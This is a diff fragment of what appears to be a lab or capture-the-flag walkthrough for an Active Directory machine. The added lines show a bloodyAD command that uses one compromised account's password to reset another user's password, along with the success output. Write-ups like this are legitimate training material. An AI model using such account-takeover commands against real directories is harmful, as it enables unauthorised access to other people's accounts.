@@ -663,7 +663,19 @@ This user is now compromised
 
 This user has the ability to change the password of `javier.mmarshall`
 
+# Compromising `javier.mmarshall`
 
+```python
+❯❯❯ bloodyAD --host dc01.mirage.htb -d mirage.htb -u 'mark.bbond' -p '1day@atime' -k set password 'javier.mmarshall' 'Password123!'
+Clock skew detected. Adjusting local time by 7:00:00.183961. Retrying operation.
+[+] Password changed successfully!
+```
+
+This changed the users password
+
+```python
+
+```
 
 
 
